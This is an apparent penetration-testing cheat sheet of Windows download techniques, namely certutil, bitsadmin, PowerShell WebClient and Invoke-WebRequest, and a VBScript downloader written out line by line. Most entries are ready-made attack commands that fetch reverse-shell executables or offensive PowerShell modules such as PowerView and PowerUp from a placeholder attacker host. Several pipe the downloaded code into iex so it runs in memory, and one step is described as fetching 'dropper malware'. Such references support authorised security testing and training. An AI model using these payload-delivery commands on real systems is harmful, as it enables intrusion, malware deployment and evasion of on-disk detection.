# HTTP

## 01 - Command Prompt

### 1.1 - Certutil

`C:\> certutil.exe -urlcache -split -f http://<IP>:<PORT>/shell.exe C:\path\to\shell.exe`

### 1.2 - Bitsadmin

```
C:\> bitsadmin /rawreturn /transfer <job_name> http://<IP>:<PORT>/shell.exe C:\path\to\shell.exe

C:\> bitsadmin /create <job_name> | bitsadmin /transfer <job_name> http://<IP>:<PORT>/shell.exe C:\path\to\shell.exe | bitsadmin /resume <job_name> | bitsadmin /complete <job_name>
```

## 02 - Powershell

### 2.1 - Invoke-WebRequest

```
PS C:\> Invoke-WebRequest https://raw.githubusercontent.com/ZeroDayLab/PowerSploit/master/Recon/PowerView.ps1 -OutFile PowerView.ps1

PS C:\> iwr -Uri http://<IP>:<PORT>/putty.exe -OutFile C:\Temp\putty.exe
```

- Downloading the dropper malware and save the disk

`PS C:\> (New-Object Net.WebClient).DownloadFile('http://<IP>:<PORT>/shell.exe', 'rsh.exe')`

- Downloads and running the powershell module through memory

```
PS C:\> iex (New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/PowerUp.ps1')

PS C:\> Invoke-WebRequest http://<IP>:<PORT>/rev.ps1 | iex
```

- Internet Explorer Basic Parsing

`PS C:\> iwr https://<IP>:<PORT>/PowerView.ps1 -UseBasicParsing | iex`

### 2.2 - DownloadFile

```powershell
PS C:\> $storageDir = $pwd
$webclient = New-Object Net.WebClient
$url = "http://<IP>:<PORT>/shell.exe"
$file = "rsh.exe"
$webclient.DownloadFile($url, $file)
```

### 2.3 - Bitsadmin

`PS C:\> Start-BitsTransfer -Source http://<IP>/shell.exe -Destination C:\path\to\shell.exe`

## 03 - VBScript

`cat wget.vbs`

---

```vbscript
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray, lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

## References

- [Windows for Pentester Bitsadmin](https://www.hackingarticles.in/windows-for-pentester-bitsadmin/)

- [SS64 Powershell Get-BitsTransfer](https://ss64.com/ps/get-bitstransfer.html)

- [HTTP.sys web server implementation in ASP.NET Core](https://docs.microsoft.com/en-us/aspnet/core/fundamentals/servers/httpsys?view=aspnetcore-6.0)

- [Encryption and Decryption of Hex2Bin and Base64 Using Certutil](https://developpaper.com/encryption-and-decryption-of-hex2bin-and-base64-using-certutil/)

- [SS64 Forum Topic: Decode/Encode BASE64/HEX strings. Print symbols by HEX code.](https://ss64.org/viewtopic.php?t=99)

- [Sushant747 Transferring Files to Windows](https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files_to_windows.html)

- [Windows File Downloads](https://notes.benheater.com/books/file-transfers-and-data-exfiltration/page/windows-file-downloads)